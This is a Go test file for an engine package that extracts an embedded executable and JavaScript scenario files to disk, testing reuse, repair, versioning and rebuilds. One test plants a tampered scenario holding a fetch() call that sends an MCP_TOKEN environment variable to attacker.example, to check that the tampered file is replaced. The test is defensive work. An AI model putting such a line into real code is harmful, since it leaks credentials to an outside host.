package engine

import (
	"os"
	"path/filepath"
	"testing"
	"testing/fstest"
	"time"
)

func TestExtractFileWritesAndReuses(t *testing.T) {
	root := t.TempDir()
	payload := []byte("#!/bin/sh\necho fake engine\n")
	p, err := extractFile(payload, root, "mcpload-engine")
	if err != nil {
		t.Fatal(err)
	}
	got, err := os.ReadFile(p)
	if err != nil || string(got) != string(payload) {
		t.Fatalf("content %q, %v", got, err)
	}
	if st, _ := os.Stat(p); st.Mode().Perm()&0o100 == 0 && !isWindows() {
		t.Errorf("not executable: %v", st.Mode())
	}
	// Second call reuses the file (same path, not rewritten).
	old := time.Now().Add(-time.Hour)
	if err := os.Chtimes(p, old, old); err != nil {
		t.Fatal(err)
	}
	p2, err := extractFile(payload, root, "mcpload-engine")
	if err != nil || p2 != p {
		t.Fatalf("reuse: %q, %v (want %q)", p2, err, p)
	}
	if st, _ := os.Stat(p); st.ModTime().After(old.Add(time.Second)) {
		t.Errorf("file was rewritten")
	}
	// No temp files are left behind.
	entries, _ := os.ReadDir(filepath.Dir(p))
	if len(entries) != 1 {
		t.Errorf("want only the engine in %s, got %d entries", filepath.Dir(p), len(entries))
	}
}

func TestExtractFileRepairsCorruptCopy(t *testing.T) {
	root := t.TempDir()
	payload := []byte("the real engine")
	p, err := extractFile(payload, root, "mcpload-engine")
	if err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(p, []byte("the real enginX"), 0o755); err != nil {
		t.Fatal(err)
	}
	if _, err := extractFile(payload, root, "mcpload-engine"); err != nil {
		t.Fatal(err)
	}
	if got, _ := os.ReadFile(p); string(got) != string(payload) {
		t.Fatalf("not repaired: %q", got)
	}
}

func TestExtractFileVersionsSideBySide(t *testing.T) {
	root := t.TempDir()
	a, err := extractFile([]byte("engine a"), root, "e")
	if err != nil {
		t.Fatal(err)
	}
	b, err := extractFile([]byte("engine b"), root, "e")
	if err != nil {
		t.Fatal(err)
	}
	if a == b || filepath.Dir(a) == filepath.Dir(b) {
		t.Fatalf("different payloads share a folder: %q %q", a, b)
	}
}

func TestExtractTree(t *testing.T) {
	root := t.TempDir()
	fsys := fstest.MapFS{
		"agent-session.js": {Data: []byte("import './lib/session.js'\n")},
		"lib/session.js":   {Data: []byte("export {}\n")},
	}
	base, err := extractTree(fsys, root, "scenarios")
	if err != nil {
		t.Fatal(err)
	}
	for name, f := range fsys {
		got, err := os.ReadFile(filepath.Join(base, "scenarios", filepath.FromSlash(name)))
		if err != nil || string(got) != string(f.Data) {
			t.Errorf("%s: %q, %v", name, got, err)
		}
	}
	again, err := extractTree(fsys, root, "scenarios")
	if err != nil || again != base {
		t.Fatalf("reuse: %q, %v", again, err)
	}
	// A changed tree goes to a new folder; no temp folders remain.
	fsys["soak.js"] = &fstest.MapFile{Data: []byte("x")}
	other, err := extractTree(fsys, root, "scenarios")
	if err != nil || other == base {
		t.Fatalf("changed tree: %q, %v", other, err)
	}
	entries, _ := os.ReadDir(root)
	if len(entries) != 2 {
		t.Errorf("want 2 trees in %s, got %d", root, len(entries))
	}
}

func TestExtractTreeRebuildsIncomplete(t *testing.T) {
	root := t.TempDir()
	fsys := fstest.MapFS{"a.js": {Data: []byte("a")}}
	base, err := extractTree(fsys, root, "scenarios")
	if err != nil {
		t.Fatal(err)
	}
	// Simulate an interrupted extraction: marker and file missing.
	os.Remove(filepath.Join(base, completeMarker))
	os.Remove(filepath.Join(base, "scenarios", "a.js"))
	if _, err := extractTree(fsys, root, "scenarios"); err != nil {
		t.Fatal(err)
	}
	if got, _ := os.ReadFile(filepath.Join(base, "scenarios", "a.js")); string(got) != "a" {
		t.Fatalf("not rebuilt: %q", got)
	}
}

// A scenario changed after extraction (the marker is still there) is not
// reused: the engine would run it.
func TestExtractTreeReplacesModifiedFile(t *testing.T) {
	root := t.TempDir()
	fsys := fstest.MapFS{
		"agent-session.js": {Data: []byte("import './lib/session.js'\n")},
		"lib/session.js":   {Data: []byte("export {}\n")},
	}
	base, err := extractTree(fsys, root, "scenarios")
	if err != nil {
		t.Fatal(err)
	}
	p := filepath.Join(base, "scenarios", "lib", "session.js")
	if err := os.WriteFile(p, []byte("fetch('https://attacker.example/?t=' + __ENV.MCP_TOKEN)\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	again, err := extractTree(fsys, root, "scenarios")
	if err != nil || again != base {
		t.Fatalf("re-extract: %q, %v (want %q)", again, err, base)
	}
	if got, _ := os.ReadFile(p); string(got) != "export {}\n" {
		t.Fatalf("modified scenario reused: %q", got)
	}
	// A deleted file is restored too.
	os.Remove(filepath.Join(base, "scenarios", "agent-session.js"))
	if _, err := extractTree(fsys, root, "scenarios"); err != nil {
		t.Fatal(err)
	}
	if !isFile(filepath.Join(base, "scenarios", "agent-session.js")) {
		t.Fatal("deleted scenario not restored")
	}
	// No temp folders remain.
	if entries, _ := os.ReadDir(root); len(entries) != 1 {
		t.Errorf("want 1 tree in %s, got %d entries", root, len(entries))
	}
}

func TestNotEmbeddedByDefault(t *testing.T) {
	if Embedded() {
		t.Skip("built with -tags embedengine")
	}
	if _, err := Path(); err != ErrNotEmbedded {
		t.Fatalf("Path: %v", err)
	}
	if _, err := ScenariosDir(); err != ErrNotEmbedded {
		t.Fatalf("ScenariosDir: %v", err)
	}
}

func isWindows() bool { return filepath.Separator == '\\' }
